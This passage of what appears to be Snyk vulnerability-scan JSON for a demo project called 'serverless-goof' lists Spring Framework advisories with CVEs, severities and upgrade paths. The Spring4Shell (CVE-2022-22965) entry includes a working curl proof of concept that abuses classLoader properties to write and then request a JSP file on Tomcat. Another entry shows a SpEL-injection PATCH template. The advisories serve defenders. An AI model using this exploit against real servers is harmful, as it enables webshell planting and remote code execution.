      "description": "## Overview\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) by providing a specially crafted SpEL expression, that might result in an `OutOfMemoryError`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `org.springframework:spring-expression` to version 5.3.17, 5.2.20.RELEASE or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/83ac65915871067c39a4fb255e0d484c785c0c11)\n- [GitHub Issue](https://github.com/spring-projects/spring-framework/issues/28145)\n- [Pivotal Security Advisory](https://pivotal.io/security/cve-2022-22950)\n",
      "disclosureTime": "2022-03-29T09:51:43Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "5.3.17",
        "5.2.20.RELEASE"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2434828",
      "identifiers": {
        "CWE": [
          "CWE-400"
        ],
        "CVE": [
          "CVE-2022-22950"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-04-27T07:56:58.480554Z",
      "moduleName": "org.springframework:spring-expression",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-expression",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-03-29T14:24:08Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/83ac65915871067c39a4fb255e0d484c785c0c11"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/spring-projects/spring-framework/issues/28145"
        },
        {
          "title": "Pivotal Security Advisory",
          "url": "https://pivotal.io/security/cve-2022-22950"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[5.3.0,5.3.17)",
          "[,5.2.20.RELEASE)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework",
        "artifactId": "spring-expression"
      },
      "severityWithCritical": "medium",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "org.springframework.data:spring-data-rest-webmvc@2.6.6.RELEASE",
        "org.springframework:spring-webmvc@5.0.6.RELEASE",
        "org.springframework:spring-expression@5.0.6.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.data:spring-data-rest-webmvc@3.5.10",
        "org.springframework:spring-webmvc@5.3.17",
        "org.springframework:spring-expression@5.3.17"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-expression",
      "version": "5.0.6.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F",
      "alternativeIds": [],
      "creationTime": "2022-03-30T21:42:31.436000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 9.8,
      "description": "## Overview\n[org.springframework:spring-beans](https://www.baeldung.com/spring-bean) is a package that is the basis for Spring Framework's IoC container. The BeanFactory interface provides an advanced configuration mechanism capable of managing any type of object.\n\nAffected versions of this package are vulnerable to Remote Code Execution via manipulation of `ClassLoader` that is achievable with a POST HTTP request. This could allow an attacker to execute a webshell on a victim's application (TomCat), or download arbitrary files from the server (Payara/Glassfish).\r\n\r\n**Note:** \r\n* Current public exploits require victim applications to be built with JRE version 9 (or above) and to be deployed on either Tomcat, Payara or Glassfish. \r\n* However, we have confirmed that it is technically possible for additional exploits to work under additional application configurations as well. \r\n* As such while we recommend users prioritise first remediating against the configuration described above, for full protection we also recommend upgrading all vulnerable versions to the fixed `spring-beans` version regardless of the application configuration.\r\n\r\n### Update Log \r\n* **31/03/2022 -** Severity was raised from 8.1 to 9.8\r\n* **08/04/2022 -** Advisory was updated to reflect that Snyk's security research team was able to author a working PoC of this vulnerability against applications that are deployed on Payara (which is based on Glassfish). \r\n\r\n\r\n## PoC\r\n```java\r\n1/ docker run -p 8888:8080 --rm --interactive --tty --name vm1 tomcat:9.0\r\n2/ ./mvnw install\r\n3/ docker cp target/handling-form-submission-complete.war vm1:/usr/local/tomcat/webapps\r\n4/ curl -X POST \\\r\n  -H \"pre:<%\" \\\r\n  -H \"post:;%>\" \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}iSystem.out.println(123)%{post}i' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/handling-form-submission-complete' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \\\r\n  http://localhost:8888/handling-form-submission-complete/greeting\r\n5/ curl http://localhost:8888/handling-form-submission-complete/rce.jsp\r\n```\n## Remediation\nUpgrade `org.springframework:spring-beans` to version 5.2.20, 5.3.18 or higher.\n## References\n- [CyberKendra Post](https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html)\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15)\n- [LunaSec Blog](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/)\n- [Payara Blogpost](https://blog.payara.fish/payara-and-spring4shell)\n- [Payara PoC](https://github.com/CalumHutton/CVE-2022-22965-PoC_Payara)\n- [Snyk Blog - Technical Breakdown](https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/)\n- [Snyk PoC](https://github.com/Kirill89/CVE-2022-22965-PoC)\n- [Spring Security Announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)\n- [Spring Tomcat Mitigation Advice](https://spring.io/blog/2022/04/01/spring-framework-rce-mitigation-alternative)\n",
      "disclosureTime": "2022-03-30T21:42:24Z",
      "exploit": "Functional",
      "functions": [
        {
          "functionId": {
            "filePath": "org/springframework/beans/CachedIntrospectionResults.java",
            "className": "CachedIntrospectionResults",
            "functionName": "<init>"
          },
          "version": [
            "[ ,5.2.20)",
            "[5.3.0, 5.3.18)"
          ]
        }
      ],
      "fixedIn": [
        "5.2.20",
        "5.3.18"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2436751",
      "identifiers": {
        "CWE": [
          "CWE-94"
        ],
        "CVE": [
          "CVE-2022-22965"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-05-01T15:25:01.114594Z",
      "moduleName": "org.springframework:spring-beans",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-beans",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-03-30T22:32:44Z",
      "references": [
        {
          "title": "CyberKendra Post",
          "url": "https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15"
        },
        {
          "title": "LunaSec Blog",
          "url": "https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/"
        },
        {
          "title": "Payara Blogpost",
          "url": "https://blog.payara.fish/payara-and-spring4shell"
        },
        {
          "title": "Payara PoC",
          "url": "https://github.com/CalumHutton/CVE-2022-22965-PoC_Payara"
        },
        {
          "title": "Snyk Blog - Technical Breakdown",
          "url": "https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/"
        },
        {
          "title": "Snyk PoC",
          "url": "https://github.com/Kirill89/CVE-2022-22965-PoC"
        },
        {
          "title": "Spring Security Announcement",
          "url": "https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement"
        },
        {
          "title": "Spring Tomcat Mitigation Advice",
          "url": "https://spring.io/blog/2022/04/01/spring-framework-rce-mitigation-alternative"
        }
      ],
      "severity": "critical",
      "socialTrendAlert": false,
      "title": "Remote Code Execution",
      "functions_new": [
        {
          "functionId": {
            "className": "org.springframework.beans.CachedIntrospectionResults",
            "functionName": "<init>"
          },
          "version": [
            "[ ,5.2.20)",
            "[5.3.0, 5.3.18)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[ ,5.2.20)",
          "[5.3.0, 5.3.18)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework",
        "artifactId": "spring-beans"
      },
      "severityWithCritical": "critical",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "org.springframework.data:spring-data-rest-webmvc@2.6.6.RELEASE",
        "org.springframework:spring-webmvc@5.0.6.RELEASE",
        "org.springframework:spring-beans@5.0.6.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.data:spring-data-rest-webmvc@3.5.11",
        "org.springframework:spring-webmvc@5.3.19",
        "org.springframework:spring-beans@5.3.19"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-beans",
      "version": "5.0.6.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2022-04-14T11:54:10.207823Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 3.7,
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Handling of Case Sensitivity via the patterns for `disallowedFields` on a `DataBinder`. As a result, a field is not effectively protected unless it is listed with both upper and lower case for the first character of the field, including nested fields within the property path.\n## Remediation\nUpgrade `org.springframework:spring-context` to version 5.2.21, 5.3.19 or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/833e750175349ab4fd502109a8b41af77e25cdea)\n- [GitHub Issue](https://github.com/spring-projects/spring-framework/issues/28333)\n- [Spring Blog Post](https://spring.io/blog/2022/04/13/spring-framework-data-binding-rules-vulnerability-cve-2022-22968)\n- [Tanzu Advisory](https://tanzu.vmware.com/security/cve-2022-22968)\n",
      "disclosureTime": "2022-04-14T11:43:54Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "5.2.21",
        "5.3.19"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2689634",
      "identifiers": {
        "CWE": [
          "CWE-178"
        ],
        "CVE": [
          "CVE-2022-22968"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-04-14T12:09:40.109582Z",
      "moduleName": "org.springframework:spring-context",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-context",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-04-14T12:09:40.107275Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/833e750175349ab4fd502109a8b41af77e25cdea"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/spring-projects/spring-framework/issues/28333"
        },
        {
          "title": "Spring Blog Post",
          "url": "https://spring.io/blog/2022/04/13/spring-framework-data-binding-rules-vulnerability-cve-2022-22968"
        },
        {
          "title": "Tanzu Advisory",
          "url": "https://tanzu.vmware.com/security/cve-2022-22968"
        }
      ],
      "severity": "low",
      "socialTrendAlert": false,
      "title": "Improper Handling of Case Sensitivity",
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,5.2.21)",
          "[5.3.0, 5.3.19)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework",
        "artifactId": "spring-context"
      },
      "severityWithCritical": "low",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.github.derjust:spring-data-dynamodb@4.3.1",
        "org.springframework:spring-context@5.0.6.RELEASE"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "org.springframework:spring-context",
      "version": "5.0.6.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2019-09-19T12:18:25.985657Z",
      "credit": [
        "Mariusz Luciow"
      ],
      "cvssScore": 5.9,
      "description": "## Overview\n[org.springframework:spring-webmvc](https://mvnrepository.com/artifact/org.springframework/spring-webmvc) is a package that provides Model-View-Controller (MVC) architecture and ready components that can be used to develop flexible and loosely coupled web applications.\n\nAffected versions of this package are vulnerable to Information Exposure. It allows web applications to enable cross-domain requests via JSONP (JSON with Padding) through `AbstractJsonpResponseBodyAdvice` for REST controllers, and `MappingJackson2JsonView` for browser requests. When `MappingJackson2JsonView` is configured in an application, JSONP support is automatically ready to use through the `jsonp` and `callback` JSONP parameters, enabling cross-domain requests.\r\nAllowing cross-domain requests from untrusted origins may expose user information to 3rd party browser scripts.\n## Remediation\nUpgrade `org.springframework:spring-webmvc` to version 4.3.18.RELEASE, 5.0.7.RELEASE or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/b80c13b722bb207ddf43f53a007ee3ddc1dd2e26)\n- [GitHub Issue](https://github.com/spring-projects/spring-framework/issues/21338)\n- [Pivotal Security](https://pivotal.io/security/cve-2018-11040)\n",
      "disclosureTime": "2016-12-25T16:51:51Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "4.3.18.RELEASE",
        "5.0.7.RELEASE"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-467268",
      "identifiers": {
        "CWE": [
          "CWE-200"
        ],
        "CVE": [
          "CVE-2018-11040"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-12-14T14:41:02.735179Z",
      "moduleName": "org.springframework:spring-webmvc",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-webmvc",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-12-25T16:51:51Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/b80c13b722bb207ddf43f53a007ee3ddc1dd2e26"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/spring-projects/spring-framework/issues/21338"
        },
        {
          "title": "Pivotal Security",
          "url": "https://pivotal.io/security/cve-2018-11040"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Information Exposure",
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[4.3.0.RELEASE,4.3.18.RELEASE)",
          "[5.0.0.RELEASE,5.0.7.RELEASE)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework",
        "artifactId": "spring-webmvc"
      },
      "severityWithCritical": "medium",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "org.springframework.data:spring-data-rest-webmvc@2.6.6.RELEASE",
        "org.springframework:spring-webmvc@5.0.6.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.data:spring-data-rest-webmvc@3.0.8.RELEASE",
        "org.springframework:spring-webmvc@5.0.7.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-webmvc",
      "version": "5.0.6.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2022-03-31T13:12:18.783639Z",
      "credit": [
        "trungPa",
        "Jonathan Leitschuh"
      ],
      "cvssScore": 7.8,
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Insecure Temporary File via the `org.springframework.boot.web.server.AbstractConfigurableWebServerFactory.createTempDir` method, allowing for temporary directory hijacking and privilege escalation.\n## Remediation\nUpgrade `org.springframework.boot:spring-boot` to version 2.2.11.RELEASE or higher.\n## References\n- [GitHub Fix Commit](https://github.com/spring-projects/spring-boot/commit/667ccdae84822072f9ea1a27ed5c77964c71002d)\n",
      "disclosureTime": "2022-03-31T12:44:50Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "2.2.11.RELEASE"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORKBOOT-2438287",
      "identifiers": {
        "CWE": [
          "CWE-377",
          "CWE-379"
        ],
        "GHSA": [
          "GHSA-cm59-pr5q-cw85"
        ],
        "CVE": [
          "CVE-2022-27772"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-04-01T10:37:05.693471Z",
      "moduleName": "org.springframework.boot:spring-boot",
      "packageManager": "maven",
      "packageName": "org.springframework.boot:spring-boot",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-03-31T15:29:45Z",
      "references": [
        {
          "title": "GitHub Fix Commit",
          "url": "https://github.com/spring-projects/spring-boot/commit/667ccdae84822072f9ea1a27ed5c77964c71002d"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Insecure Temporary File",
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,2.2.11.RELEASE)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework.boot",
        "artifactId": "spring-boot"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "org.springframework.cloud:spring-cloud-function-adapter-aws@1.0.0.RC2",
        "org.springframework.boot:spring-boot-starter@2.0.2.RELEASE",
        "org.springframework.boot:spring-boot@2.0.2.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.cloud:spring-cloud-function-adapter-aws@3.0.7.RELEASE",
        "org.springframework.boot:spring-boot-starter@2.3.0.RELEASE",
        "org.springframework.boot:spring-boot@2.3.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework.boot:spring-boot",
      "version": "2.0.2.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F",
      "alternativeIds": [],
      "creationTime": "2022-03-30T11:05:32.579090Z",
      "credit": [
        "m09u3r"
      ],
      "cvssScore": 9.8,
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Remote Code Execution. An attacker is able to provide a crafted `SpEL` as a routing-expression that may result in access to local resources or even remote code execution.\n## Remediation\nUpgrade `org.springframework.cloud:spring-cloud-function-context` to version 3.1.7, 3.2.3 or higher.\n## References\n- [GitHub Commit](https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f)\n- [GitHub Issue](https://github.com/spring-cloud/spring-cloud-function/issues/840)\n- [VMWare Security Advisory](https://tanzu.vmware.com/security/cve-2022-22963)\n",
      "disclosureTime": "2022-03-30T10:53:01Z",
      "exploit": "Functional",
      "functions": [],
      "fixedIn": [
        "3.1.7",
        "3.2.3"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORKCLOUD-2436645",
      "identifiers": {
        "CWE": [
          "CWE-94",
          "CWE-770",
          "CWE-497"
        ],
        "CVE": [
          "CVE-2022-22963"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-04-29T15:25:00.903066Z",
      "moduleName": "org.springframework.cloud:spring-cloud-function-context",
      "packageManager": "maven",
      "packageName": "org.springframework.cloud:spring-cloud-function-context",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-03-30T12:36:43Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/spring-cloud/spring-cloud-function/issues/840"
        },
        {
          "title": "VMWare Security Advisory",
          "url": "https://tanzu.vmware.com/security/cve-2022-22963"
        }
      ],
      "severity": "critical",
      "socialTrendAlert": true,
      "title": "Remote Code Execution",
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,3.1.7)",
          "[3.2.0,3.2.3)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework.cloud",
        "artifactId": "spring-cloud-function-context"
      },
      "severityWithCritical": "critical",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "org.springframework.cloud:spring-cloud-function-adapter-aws@1.0.0.RC2",
        "org.springframework.cloud:spring-cloud-function-context@1.0.0.RC2"
      ],
      "upgradePath": [
        false,
        "org.springframework.cloud:spring-cloud-function-adapter-aws@3.1.7",
        "org.springframework.cloud:spring-cloud-function-context@3.1.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework.cloud:spring-cloud-function-context",
      "version": "1.0.0.RC2"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N",
      "alternativeIds": [],
      "creationTime": "2021-10-27T14:28:26.321856Z",
      "credit": [
        "Brian Schrader"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[org.springframework.data:spring-data-rest-webmvc](https://github.com/SpringSource/spring-data-rest) is a maven plugin for Spring Data REST - WebMVC.\n\nAffected versions of this package are vulnerable to Information Exposure. HTTP resources implemented by custom controllers using a configured base API path and a controller type-level request mapping are additionally exposed under URIs that can potentially be exposed for unauthorized access depending on the Spring Security configuration.\r\n\r\n**Note:** This vulnerability is only exploitable in a project if the Spring Data REST base path configuration is set to a non-empty string AND the project registers a custom Spring MVC controller to customize HTTP resources in the URI space of Spring Data REST and that controller uses a type-level @RequestMapping annotation;the project only secures the paths exposed by Spring Data REST within the base path but does not apply security measures to URIs matching the mappings without the configured base path prepended.\n## Remediation\nUpgrade `org.springframework.data:spring-data-rest-webmvc` to version 3.5.6, 3.4.14 or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-data-rest/commit/46dc6e03fcd13cadfafeab22ba813c12a8dc9688)\n- [GitHub Issue](https://github.com/spring-projects/spring-data-rest/issues/1342)\n- [Pivotal Security Advisory](https://pivotal.io/security/cve-2021-22047)\n",
      "disclosureTime": "2021-10-27T13:51:27Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "3.5.6",
        "3.4.14"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORKDATA-1767823",
      "identifiers": {
        "CWE": [
          "CWE-200"
        ],
        "CVE": [
          "CVE-2021-22047"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-10-27T16:55:10.402096Z",
      "moduleName": "org.springframework.data:spring-data-rest-webmvc",
      "packageManager": "maven",
      "packageName": "org.springframework.data:spring-data-rest-webmvc",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-10-27T16:55:10.399667Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-data-rest/commit/46dc6e03fcd13cadfafeab22ba813c12a8dc9688"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/spring-projects/spring-data-rest/issues/1342"
        },
        {
          "title": "Pivotal Security Advisory",
          "url": "https://pivotal.io/security/cve-2021-22047"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Information Exposure",
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[3.5.0,3.5.6)",
          "[,3.4.14)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework.data",
        "artifactId": "spring-data-rest-webmvc"
      },
      "severityWithCritical": "medium",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "org.springframework.data:spring-data-rest-webmvc@2.6.6.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.data:spring-data-rest-webmvc@3.4.14"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework.data:spring-data-rest-webmvc",
      "version": "2.6.6.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:R",
      "alternativeIds": [],
      "creationTime": "2017-11-05T11:55:21.560000Z",
      "credit": [
        "Man Yue Mo"
      ],
      "cvssScore": 9.8,
      "description": "## Overview\n[org.springframework.data:spring-data-rest-webmvc](https://github.com/SpringSource/spring-data-rest) is a maven plugin for Spring Data REST - WebMVC.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. It is caused due to the way Spring uses it's own expression language in the Data REST component.\r\n\r\nThe Spring Expression Language (SpEL) is an expression language (similar to OGNL, MVEL, and JBoss EL) which serves as the foundation for expression evaluation within the Spring portfolio. It supports querying and manipulating an object graph at runtime. \r\n\r\nUser input was not validated upon sending a PATCH request  with a `path` parameter to `spring-data-rest` servers. An attacker may sumit a specially crafted PATCH request with a path containing SpEL syntax, and the Spring REST server, would in turn run these expressions.\r\n\r\nAn example for an invalid PATCH request:\r\n\r\n```json\r\n[\r\n\t{\"op\":\"replace\", \"path\":\"<Malicious SpEL code>\", \"value\": \"bar\" }\r\n]\r\n```\n## Remediation\nUpgrade `org.springframework.data:spring-data-rest-webmvc` to version 2.6.7.RELEASE or higher.\n## References\n- [Exploit DB](https://www.exploit-db.com/exploits/44289)\n- [GitHub Commit](https://github.com/spring-projects/spring-data-rest/commit/824e51a1304bbc8334ac0b96ffaef588177e6ccd)\n- [lgtm Blog](https://lgtm.com/blog/spring_data_rest_CVE-2017-8046)\n- [Pivotal Security](https://pivotal.io/security/cve-2017-8046)\n- [Spring Jira Issue](https://jira.spring.io/browse/DATAREST-1127)\n",
      "disclosureTime": "2017-09-07T21:00:00Z",
      "exploit": "Functional",
      "functions": [
        {
          "functionId": {
            "filePath": "org/springframework/data/rest/webmvc/json/patch/PatchOperation.java",
            "className": "PatchOperation",
            "functionName": "evaluateValueFromTarget"
          },
          "version": [
            "[,2.6.7)"
          ]
        },
        {
          "functionId": {
            "filePath": "org/springframework/data/rest/webmvc/json/patch/AddOperation.java",
            "className": "AddOperation",
            "functionName": "evaluateValueFromTarget"
          },
          "version": [
            "[2.6.4,2.6.7)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.RELEASE"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORKDATA-31577",
      "identifiers": {
        "CWE": [
          "CWE-94"
        ],
        "CVE": [
          "CVE-2017-8046"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-12-14T14:41:05.112672Z",
      "moduleName": "org.springframework.data:spring-data-rest-webmvc",
      "packageManager": "maven",
      "packageName": "org.springframework.data:spring-data-rest-webmvc",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-04-16T08:27:24Z",
      "references": [
        {
          "title": "Exploit DB",
          "url": "https://www.exploit-db.com/exploits/44289"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-data-rest/commit/824e51a1304bbc8334ac0b96ffaef588177e6ccd"
        },
        {
          "title": "lgtm Blog",
          "url": "https://lgtm.com/blog/spring_data_rest_CVE-2017-8046"
        },
        {
          "title": "Pivotal Security",
          "url": "https://pivotal.io/security/cve-2017-8046"
        },
        {
          "title": "Spring Jira Issue",
          "url": "https://jira.spring.io/browse/DATAREST-1127"
        }
      ],
      "severity": "critical",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "functions_new": [
        {
          "functionId": {
            "className": "org.springframework.data.rest.webmvc.json.patch.PatchOperation",
            "functionName": "evaluateValueFromTarget"
          },
          "version": [
            "[,2.6.7)"
          ]
        },
        {
          "functionId": {
            "className": "org.springframework.data.rest.webmvc.json.patch.AddOperation",
            "functionName": "evaluateValueFromTarget"
          },
          "version": [
            "[2.6.4,2.6.7)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.RELEASE)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework.data",
        "artifactId": "spring-data-rest-webmvc"
      },
      "severityWithCritical": "critical",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "org.springframework.data:spring-data-rest-webmvc@2.6.6.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.data:spring-data-rest-webmvc@2.6.7.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework.data:spring-data-rest-webmvc",
      "version": "2.6.6.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2018-04-12T09:28:06.422000Z",
      "credit": [
        "Philippe Arteau"
      ],
      "cvssScore": 9.8,
      "description": "## Overview\n[org.springframework.data:spring-data-commons](https://github.com/spring-projects/spring-data-build.git) is a maven plugin to centralize common resources and configuration for Spring Data Maven builds.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. An unauthenticated remote malicious user (or attacker) can supply specially crafted request parameters against Spring Data REST backed HTTP resources or using Spring Data's projection-based request payload binding hat can lead to a remote code execution attack.\n## Remediation\nUpgrade `org.springframework.data:spring-data-commons` to version 1.13.11.RELEASE, 2.0.6.RELEASE or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653)\n- [GitHub Commit](https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a)\n- [Pivotal Security Advisory](https://pivotal.io/security/cve-2018-1273)\n- [PoC](https://github.com/jas502n/cve-2018-1273)\n- [Spring Docs](https://docs.spring.io/spring-data/jpa/docs/current/reference/html/#core.web.binding)\n- [Spring Jira Issue](https://jira.spring.io/browse/DATACMNS-1282)\n",
      "disclosureTime": "2018-04-11T13:29:00Z",
